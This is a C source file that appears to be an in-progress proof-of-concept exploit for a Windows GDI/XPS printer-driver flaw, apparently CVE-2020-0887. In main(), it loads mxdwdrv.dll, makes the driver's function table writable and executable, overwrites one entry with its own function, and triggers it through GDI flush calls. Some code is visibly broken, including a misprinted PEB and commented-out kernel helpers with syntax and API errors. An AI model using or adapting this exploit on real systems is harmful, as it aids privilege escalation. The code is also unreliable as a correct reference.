#include <windows.h>
//#include <wdm.h>
#include <ntstatus.h>
#include <stdio.h>
#include <winddi.h>
#include <winspool.h> 
//#include <ntdef.h>
#include <dbghelp.h>

#pragma comment(lib, "ntdll.lib")
//#pragma comment(lib,"Ntoskrnl.lib")





typedef BOOL(__stdcall* gDrvEnableDriver)(ULONG, ULONG, DRVENABLEDATA*);
typedef void(_stdcall* gDrvDisableDriver)();
typedef NTSTATUS(__stdcall* pDrvEnableDriver)(PVOID p);
pDrvEnableDriver		g_originalDED = NULL;
PVOID g_ppDED = NULL;
typedef void(__stdcall* gNtGdiFlushUserBatch)();
typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PVOID FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};

} PEB, * PPEB;


typedef struct _TEB
{
	PVOID NtTib1;
	PVOID NtTib2;
	PVOID NtTib3;
	PVOID NtTib4;
	PVOID NtTib5;
	PVOID NtTib6;
	PVOID NtTib7;
	PVOID EnvironmentPointer;
	PVOID ClientId1;
	PVOID ClientId2;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	PPEB ProcessEnvironmentBlock;

	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	PVOID CsrClientThread;
	PVOID Win32ThreadInfo;

} TEB, * PTEB;


/*
typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	// ...
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
*/
HDC hdc = NULL;

typedef BOOL(*ExtTextOutW_t)(IN HDC hDC, //verified
	IN INT 	XStart,
	IN INT 	YStart,
	IN UINT 	fuOptions,
	IN OPTIONAL LPRECT 	UnsafeRect,
	IN LPWSTR 	UnsafeString,
	IN INT 	Count,
	IN OPTIONAL LPINT 	UnsafeDx,
	IN DWORD 	dwCodePage
	);

void testData() {
	EndDoc(hdc);
}

/*
PVOID NTAPI RtlxFindExportedRoutineByName(_In_ PVOID DllBase, _In_ const char* ExportName) {
	PULONG NameTable;
	PUSHORT OrdinalTable;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory;
	LONG Low = 0, Mid = 0, High, Ret;
	USHORT Ordinal;
	PVOID Function;
	ULONG ExportSize;
	PULONG ExportTable;
	ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)ImageDirectoryEntryToData(DllBase, TRUE, IMAGE_DIRECTORY_ENTRY_EXPORT, &ExportSize);
	if (!ExportDirectory) {
		return NULL;
	}
	NameTable = (PULONG)((ULONG_PTR)DllBase + ExportDirectory->AddressOfNames);
	OrdinalTable = (PULONG)((ULONG_PTR)DllBase + ExportDirectory->AddressOfNameOrdinals);
	High = ExportDirectory->NumberOfNames - 1;
	for (Low = 0; Low <= High; Low++) {
		Ret = strcmp(ExportName, (PCHAR)DllBase + NameTable[Low]);
		if (Ret == 0) {
			break;
		}
	}
	if (High < Low)
		return NULL;

	Ordinal = OrdinalTable[Low];
	if (Ordinal >= ExportDirectory->NumberOfFunctions)
		return NULL;

	ExportTable = (PULONG)((ULONG_PTR)DllBase + ExportDirectory->AddressOfFunctions);
	Function = (PVOID)((ULONG_PTR)DllBase + ExportTable[Ordinal]);
	return Function;

}



PVOID get_system_routine_address(LPCWSTR routine_name)
{
	UNICODE_STRING name;
	RtlInitUnicodeString(&name, routine_name);
	return MmGetSystemRoutineAddress(&name);
}

PVOID get_system_base_module(LPCWSTR module_name) {
	PVOID module_base = NULL;
	PLIST_ENTRY module_list = (PLIST_ENTRY)get_system_routine_address(L"PsLoadedModuleList");
	if (!module_list)
		return NULL;

	UNICODE_STRING name;
	RtlInitUnicodeString(&name, module_name);
	for (PLIST_ENTRY link = module_list; link != module_list->Blink; link = module_list->Flink) {
		LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(link, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (RtlInitUnicodeString(&entry->BaseDllName, &name, TRUE)) {
			module_base = entry->DllBase;
			break;
		}
	}
	return module_base;
}

PVOID get_system_module_export(LPCWSTR module_name, LPCSTR routine_name) {
	PVOID lModule = get_system_base_module(module_name);
	if (!lModule) {
		reuturn NULL;
	}
	return RtlxFindExportedRoutineByName(lModule, routine_name);
}*/

int main() {
	DOCINFO docinfo;
	PTEB teb = NtCurrentTeb();
	PPEB peb = teb->ProcessEnvironmentBlock;
	DWORD prot;
	DWORD err = NULL;
	DRVENABLEDATA pded;
	MEMORY_BASIC_INFORMATION thunkMemInfo;
	RtlZeroMemory(&pded, sizeof(DRVENABLEDATA));
	printf("TEB: %p\n", teb);
	printf("PEB: %p\n", teb);
	//DRVFN fakeFunc;
	//HMODULE drilib = LoadLibraryEx(L"C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_ce3301b66255a0fb\Amd64\mxdwdrv.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
	//HMODULE drilib = LoadLibraryExA(TEXT("mxdwdrv.dll"), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
	/*HMODULE drilib = LoadLibraryEx(L"C:\\cve2020-0887\\mxdwdrv.dll",NULL,LOAD_WITH_ALTERED_SEARCH_PATH);
	gDrvEnableDriver fDrvEnableDriver = (gDrvEnableDriver)GetProcAddress(drilib, "DrvEnableDriver");
	if (fDrvEnableDriver != NULL) {
		printf("SUCCESS\n");
		(fDrvEnableDriver)(DDI_DRIVER_VERSION_NT5_01_SP1, sizeof(pded),&pded);
		printf("PDED: %p\n", pded);
		printf("PDED: %p\n", (pded.pdrvfn));
		printf("PDED: %p\n", (pded.pdrvfn+17));
		if (!VirtualProtect(pded.pdrvfn+17, sizeof(DRVENABLEDATA), PAGE_READWRITE, &thunkMemInfo)) {
			printf("false");
			system("pause");
			return 0;
		}
		else {
			
			printf("[+]Success set ReadWrite\n");
			void (*testfn_ptr)() = &testData;
			(pded.pdrvfn+17)->pfn = (*testfn_ptr);
		}
		
		DebugBreak();

	}*/

	hdc = CreateDCA(0, "Send to OneNote", 0, 0);

	/*if (hdc == 0) {
		system("pause");
		return 0;
	}*/
	printf("HDC: %p", hdc);
	docinfo.cbSize = sizeof(DOCINFO);
	docinfo.lpszDocName = TEXT("C:\\test\\test.txt");
	docinfo.lpszOutput = TEXT("C:\\test\\test.xps");
	docinfo.lpszDatatype = (LPTSTR)(0);
	docinfo.fwType = 0;


	StartDocA(hdc,&docinfo);
	printf("StartDoc: %d\n", GetLastError());
	StartPage(hdc);
	printf("Start Page: %d\n", GetLastError());
	
	HMODULE drilib = LoadLibrary(TEXT("mxdwdrv.dll"));
	if (!drilib) {
		printf("false");
	}
	gDrvEnableDriver fDrvEnableDriver = (gDrvEnableDriver)GetProcAddress(drilib, "DrvEnableDriver");
	gDrvDisableDriver fDrvDisableDriver = (gDrvDisableDriver)GetProcAddress(drilib, "DrvDisableDriver");
	if (fDrvEnableDriver != NULL && fDrvDisableDriver !=NULL) {
		printf("SUCCESS\n");
		(fDrvEnableDriver)(DDI_DRIVER_VERSION_NT5_01_SP1, sizeof(pded), &pded);
		printf("PDED: %p\n", pded);
		printf("PDED: %p\n", (pded.pdrvfn));
		printf("PDED: %p\n", (pded.pdrvfn + 17));
		if (!VirtualProtect(pded.pdrvfn + 17, sizeof(DRVENABLEDATA), PAGE_EXECUTE_READWRITE, &thunkMemInfo)) {
			printf("false");
			system("pause");
			return 0;
		}
		else {

			printf("[+]Success set ReadWrite\n");
			void (*testfn_ptr)() = &testData;
			(pded.pdrvfn + 17)->pfn = (*testfn_ptr);
			(fDrvDisableDriver)();
		}
	}
	HMODULE win32gdif = LoadLibraryEx(L"C:\\test\\gdi32full.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
	if (!win32gdif) {
		printf("False load lib win32gdi with error: %d", GetLastError());
	}
	ExtTextOutW_t ntgdiexttextout = (ExtTextOutW_t)GetProcAddress(win32gdif,"NtGdiExtTextOutW");
	if (!ntgdiexttextout) {
		printf("Proc gdi error: %d", GetLastError());
	}
	LPCSTR a = "Test String";
	TextOutA(hdc, 1, 1, a, 11);
	printf("Text%d\n", GetLastError());
	HMODULE win32lib = LoadLibrary(TEXT("win32u.dll"));
	if (win32lib == 0) {
		printf("Not found win32lib");
		system("pause");
		return 0;
	}
	printf("Success Load win32u\n");
	gNtGdiFlushUserBatch pfnNtTestAlert = (gNtGdiFlushUserBatch)GetProcAddress(win32lib, "NtGdiFlush");
	DebugBreak();
	if (pfnNtTestAlert != 0) {
		pfnNtTestAlert();
		printf("Success\n");
		system("pause");
	}
	else {
		printf("Failt GetProc");
		system("pause");
	}

	system("pause");
	return 0;
}